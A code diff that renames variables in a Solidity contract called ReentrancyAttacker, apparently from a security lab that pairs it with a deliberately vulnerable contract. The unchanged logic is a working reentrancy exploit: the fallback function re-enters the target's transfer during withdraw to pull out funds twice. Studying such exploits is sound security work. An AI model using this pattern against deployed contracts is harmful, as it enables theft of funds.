@@ -3,29 +3,29 @@ pragma solidity >0.4.99 <0.6.0;
 import "./ReentrancyVulnerable.sol";
 
 contract ReentrancyAttacker {
-  address payable private owner;
-  ReentrancyVulnerable private vulnerable;
+  address payable private _owner;
+  ReentrancyVulnerable private _vulnerable;
 
-  constructor(address _vulnerableAddr) public {
-    owner = msg.sender;
-    vulnerable = ReentrancyVulnerable(_vulnerableAddr);
+  constructor(address vulnerable) public {
+    _owner = msg.sender;
+    _vulnerable = ReentrancyVulnerable(vulnerable);
   }
 
   modifier onlyOwner {
-    require(msg.sender == owner);
+    require(msg.sender == _owner);
     _;
   }
 
   function () payable external {
-    vulnerable.transfer(owner, msg.value);
+    _vulnerable.transfer(_owner, msg.value);
   }
 
   function deposit() payable public onlyOwner {
-    vulnerable.deposit.value(msg.value)();
+    _vulnerable.deposit.value(msg.value)();
   }
 
   function withdraw() public onlyOwner {
-    vulnerable.withdraw();
-    owner.transfer(address(this).balance);
+    _vulnerable.withdraw();
+    _owner.transfer(address(this).balance);
   }
 }
